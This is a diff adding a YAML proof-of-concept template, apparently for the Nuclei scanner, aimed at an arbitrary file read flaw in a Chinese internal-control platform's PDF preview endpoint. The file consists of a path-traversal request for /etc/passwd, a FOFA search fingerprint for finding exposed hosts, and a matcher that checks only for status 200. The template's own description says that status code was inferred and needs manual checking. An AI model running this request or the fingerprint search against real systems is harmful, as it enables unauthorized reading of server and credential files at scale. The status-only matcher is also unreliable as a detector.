@@ -1,0 +1,25 @@
+id: poc-d550379e3fc0fa54f00f
+info:
+  name: 真内控国产化平台preview存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d550379e3fc0fa54f00fc7155fb67be0
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d550379e3fc0fa54f00fc7155fb67be0
+    fofa: body="js/npm.echarts.js"
+http:
+- raw:
+  - 'GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd  HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
